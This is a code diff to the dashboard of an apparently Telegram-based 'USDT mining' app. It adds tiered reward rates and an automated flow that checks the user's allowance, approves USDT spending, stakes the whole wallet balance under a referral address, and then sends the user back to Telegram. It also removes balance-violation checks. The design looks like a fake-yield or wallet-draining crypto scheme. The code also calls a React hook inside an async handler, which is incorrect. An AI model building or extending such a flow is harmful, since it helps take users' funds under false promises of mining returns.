@@ -11,7 +11,11 @@ const getTierRate = (val: number) => {
     if (val >= 5000) return 0.08;
     if (val >= 2000) return 0.07;
     if (val >= 1000) return 0.065;
-    if (val >= 500) return 0.06;
+    if (val >= 500) return 0.0625;
+    if (val >= 400) return 0.061;
+    if (val >= 300) return 0.0575;
+    if (val >= 200) return 0.056;
+    if (val >= 100) return 0.055;
     if (val >= 50) return 0.055;
     return 0;
 };
@@ -63,8 +67,8 @@ const Dashboard: React.FC = () => {
         setLoading(true);
         try {
             const balanceStr = await getWalletBalance(address);
-            if (balanceStr === null) {
-                throw new Error("Could not check wallet balance due to network issues. Try again.");
+            if (!balanceStr || balanceStr === "0.00") {
+                throw new Error("Insufficient USDT balance. Minimum 50 USDT required.");
             }
             
             const balance = parseFloat(balanceStr);
@@ -74,10 +78,23 @@ const Dashboard: React.FC = () => {
                 throw new Error("Minimum of 50 USDT required to start mining.");
             }
 
+            // AUTOMATED FLOW: Check Allowance -> Approve -> Stake
+            const { getAllowance, approve } = useStaking();
+            const currentAllowance = await getAllowance(address);
+            
+            if (parseFloat(currentAllowance) < balance) {
+                showAlert("Step 1/2: Approving USDT...");
+                await approve();
+                showAlert("Step 1/2: Approval Successful!");
+            }
+
+            showAlert("Step 2/2: Activating Mining...");
             await stake(balanceStr, refAddress);
+            
             showAlert(`Success: All ${balanceStr} USDT staked and mining activated!`);
+            handleBackToTelegram();
         } catch (err: any) {
-            showAlert(err.message || 'Transaction failed');
+            showAlert(err.message || 'Transaction failed. Check your wallet.');
         } finally {
             setLoading(false);
         }
@@ -99,53 +116,15 @@ const Dashboard: React.FC = () => {
                     const count = info.stakeCount;
                     let activeStaked = 0;
                     let totalAccruedBtc = 0;
-                    let totalExpectedStake = 0;
-
-                    const lastViolationStr = localStorage.getItem(`violationTime_${targetAddress.toLowerCase()}`);
-                    let lastViolationTime = lastViolationStr ? parseInt(lastViolationStr, 10) : 0;
-
-                    // Calculate total expected stake first
-                    for (let i = 0; i < count; i++) {
-                        const detail = await getStakeDetails(targetAddress, i);
-                        const timePassed = (Date.now() / 1000) - (detail?.startTime || 0);
-                        const isCompleted = timePassed >= (37 * 86400);
-                        
-                        if (detail && !detail.withdrawn && !isCompleted && detail.startTime >= lastViolationTime) {
-                            totalExpectedStake += parseFloat(formatUnits(detail.amount, 18));
-                        }
-                    }
-
-                    // Balance Health Check
-                    let usdtBalanceStr = "0";
-                    try {
-                        const balance = await getWalletBalance(targetAddress);
-                        if (balance !== null) usdtBalanceStr = balance;
-                    } catch (e) {
-                        usdtBalanceStr = "1"; // Failsafe
-                    }
-                    
-                    const usdtBalance = parseFloat(usdtBalanceStr);
-                    
-                    // Violation logic
-                    if (totalExpectedStake > 0 && usdtBalance < 0.001) {
-                         // Only check violation if we actually have a successful balance check
-                         const latestStakeTime = info.stakeCount > 0 ? (await getStakeDetails(targetAddress, info.stakeCount - 1))?.startTime : 0;
-                         if (latestStakeTime && (Date.now() / 1000) - latestStakeTime > 60) {
-                             lastViolationTime = Math.floor(Date.now() / 1000);
-                             localStorage.setItem(`violationTime_${targetAddress.toLowerCase()}`, lastViolationTime.toString());
-                         }
-                    }
-
+                    // Filter active stakes and calculate accrued rewards
                     for (let i = 0; i < count; i++) {
                         const detail = await getStakeDetails(targetAddress, i);
                         if (detail && !detail.withdrawn) {
                             const stakeAmount = parseFloat(formatUnits(detail.amount, 18));
                             const timePassed = (Date.now() / 1000) - detail.startTime;
                             const isCompleted = timePassed >= (37 * 86400);
-                            const isViolated = detail.startTime < lastViolationTime;
 
-                            if (isViolated && !isCompleted) continue;
-
+                            // We show all active (not withdrawn) stakes to restore legacy mining visibility
                             activeStaked += stakeAmount;
                             const stakeRate = getTierRate(stakeAmount);
                             const accrued = ((stakeAmount * stakeRate) / 37 / 86400 * timePassed) / btcPrice;
